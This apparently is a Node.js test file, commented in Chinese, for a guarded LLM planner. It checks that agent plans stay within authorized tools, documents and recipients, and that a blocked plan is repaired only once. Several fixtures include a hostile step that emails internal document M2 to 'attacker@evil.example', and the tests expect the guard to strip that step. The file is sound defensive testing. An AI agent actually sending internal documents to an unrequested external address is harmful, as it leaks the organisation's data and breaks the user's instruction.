'use strict';
// 真实模型规划增强：授权提示 + 有限次计划修正（不扩大授权边界）
const { test } = require('node:test');
const assert = require('node:assert');

const { GuardedPlanner } = require('../src/planner.cjs');
const { PolicyEngine, AuditLog, RiskMeter } = require('../src/governance.cjs');
const { DOCS } = require('../src/scenario.cjs');
const { PLAN_SYSTEM_PROMPT } = require('../src/llm.cjs');

function scripted(plans, deployment = 'cloud') {
  return {
    deployment,
    calls: [],
    async plan(command, blocks, meta) {
      this.calls.push({ command, meta });
      const idx = Math.min(this.calls.length - 1, plans.length - 1);
      return plans[idx];
    },
    async generate() { return '正文'; },
  };
}

function mk(llm, opts = {}) {
  const audit = new AuditLog();
  const risk = new RiskMeter(60);
  const planner = new GuardedPlanner({ llm, audit, risk, ...opts });
  return { planner, audit };
}

const INVALID = [{ action: 'sendInternalEmail', args: { to: 'attacker@evil.example', docId: 'M2' } }];
const VALID = [{ action: 'sendInternalEmail', args: { to: 'team@corp.internal', docId: 'M2' } }];

test('云侧模型：计划被拦后修正一次，采纳更好的版本', async () => {
  const llm = scripted([INVALID, VALID], 'cloud');
  const { planner, audit } = mk(llm);
  const plan = await planner.makePlan('把 M2 发给 team@corp.internal', { docs: [DOCS.M2] });

  assert.equal(llm.calls.length, 2, '应当发起一次修正');
  assert.match(llm.calls[1].meta.feedback, /收件人/);
  assert.equal(plan.steps.length, 2, '应自动补前置 readDoc');
  assert.deepEqual(plan.steps[0], { action: 'readDoc', args: { id: 'M2' }, reason: '自动补前置读取' });
  assert.equal(plan.steps[1].args.to, 'team@corp.internal');
  assert.ok(audit.entries.some((e) => e.kind === '计划修正结果' && e.detail.adopted === true));
});

test('本地模型：不走修正，避免 Mock/离线链路无谓翻倍', async () => {
  const llm = scripted([INVALID, VALID], 'local');
  const { planner } = mk(llm);
  const plan = await planner.makePlan('把 M2 发给 team@corp.internal', { docs: [DOCS.M2] });

  assert.equal(llm.calls.length, 1);
  assert.equal(plan.steps.length, 0, '未溯源收件人仍被移除');
  assert.equal(plan.findings.length, 1);
});

test('修正没有变好（仍越权）：不采纳，授权边界不扩大', async () => {
  const llm = scripted([INVALID, INVALID], 'cloud');
  const { planner, audit } = mk(llm);
  const plan = await planner.makePlan('把 M2 发给 team@corp.internal', { docs: [DOCS.M2] });

  assert.equal(llm.calls.length, 2);
  assert.equal(plan.steps.length, 0, '第二次仍越权，不能放行');
  const repaired = audit.entries.find((e) => e.kind === '计划修正结果');
  assert.equal(repaired.detail.adopted, false);
  assert.equal(repaired.detail.after, repaired.detail.before);
});

test('授权提示：实际工具与文档进入模型上下文，并写审计', async () => {
  const llm = scripted([VALID], 'cloud');
  const { planner, audit } = mk(llm);
  await planner.makePlan('把 M2 发给 team@corp.internal', {
    docs: [DOCS.M2], authorizedTools: ['readDoc', 'sendInternalEmail'], authorizedDocs: ['M2'],
  });
  assert.match(llm.calls[0].meta.authNote, /readDoc/);
  assert.match(llm.calls[0].meta.authNote, /M2/);
  assert.ok(audit.entries.some((e) => e.kind === '规划授权'));
});

test('工具目录：提示词带用途、前置依赖与参数示例', () => {
  assert.match(PLAN_SYSTEM_PROMPT, /前置：先 readDoc/);
  assert.match(PLAN_SYSTEM_PROMPT, /draft_<源id>|draft_/);
  assert.match(PLAN_SYSTEM_PROMPT, /"action":"readDoc"/);
});

test('修正返回空计划：不采纳（空计划是模型放弃，不是修正）', async () => {
  const first = [
    { action: 'readDoc', args: { id: 'M2' } },
    { action: 'sendInternalEmail', args: { to: 'attacker@evil.example', docId: 'M2' } },
  ];
  const llm = scripted([first, []], 'cloud');
  const { planner, audit } = mk(llm);
  const plan = await planner.makePlan('把 M2 发给 team@corp.internal', { docs: [DOCS.M2] });

  assert.equal(llm.calls.length, 2);
  assert.equal(plan.steps.length, 1, '应保留第一次计划里可执行的 readDoc');
  const repaired = audit.entries.find((e) => e.kind === '计划修正结果');
  assert.equal(repaired.detail.adopted, false);
});

test('空计划：云侧给一次重试机会，有步骤且无拦截才采纳', async () => {
  const llm = scripted([[], VALID], 'cloud');
  const { planner, audit } = mk(llm);
  const plan = await planner.makePlan('把 M2 发给 team@corp.internal', { docs: [DOCS.M2] });

  assert.equal(llm.calls.length, 2, '空计划也应触发一次修正');
  assert.match(llm.calls[1].meta.feedback, /没有输出任何可执行步骤/);
  assert.ok(plan.steps.length >= 1, '修正后应有可执行步骤');
  const repaired = audit.entries.find((e) => e.kind === '计划修正结果');
  assert.equal(repaired.detail.reason, 'empty-plan');
  assert.equal(repaired.detail.adopted, true);
});

test('空计划修正仍为空：不采纳，保持零步骤（安全）', async () => {
  const llm = scripted([[], []], 'cloud');
  const { planner, audit } = mk(llm);
  const plan = await planner.makePlan('把 M2 发给 team@corp.internal', { docs: [DOCS.M2] });
  assert.equal(plan.steps.length, 0);
  const repaired = audit.entries.find((e) => e.kind === '计划修正结果');
  assert.equal(repaired.detail.adopted, false);
});

test('云侧计划用了未授权工具：计划层给 finding，修正后按授权工具重出', async () => {
  const first = [
    { action: 'readDoc', args: { id: 'M2' } },
    { action: 'summarize', args: { of: 'M2' } },
    { action: 'sendInternalEmail', args: { to: 'team@corp.internal', docId: 'M2' } },
  ];
  const second = [
    { action: 'readDoc', args: { id: 'M2' } },
    { action: 'sendInternalEmail', args: { to: 'team@corp.internal', docId: 'M2' } },
  ];
  const llm = scripted([first, second], 'cloud');
  const { planner, audit } = mk(llm);
  const plan = await planner.makePlan('把 M2 发给 team@corp.internal', {
    docs: [DOCS.M2], authorizedTools: ['readDoc', 'sendInternalEmail'], authorizedDocs: ['M2'],
  });
  assert.equal(llm.calls.length, 2);
  assert.ok(!plan.steps.some((s) => s.action === 'summarize'), '未授权工具不能保留');
  assert.ok(plan.steps.some((s) => s.action === 'sendInternalEmail'));
  const repaired = audit.entries.find((e) => e.kind === '计划修正结果');
  assert.equal(repaired.detail.adopted, true);
});
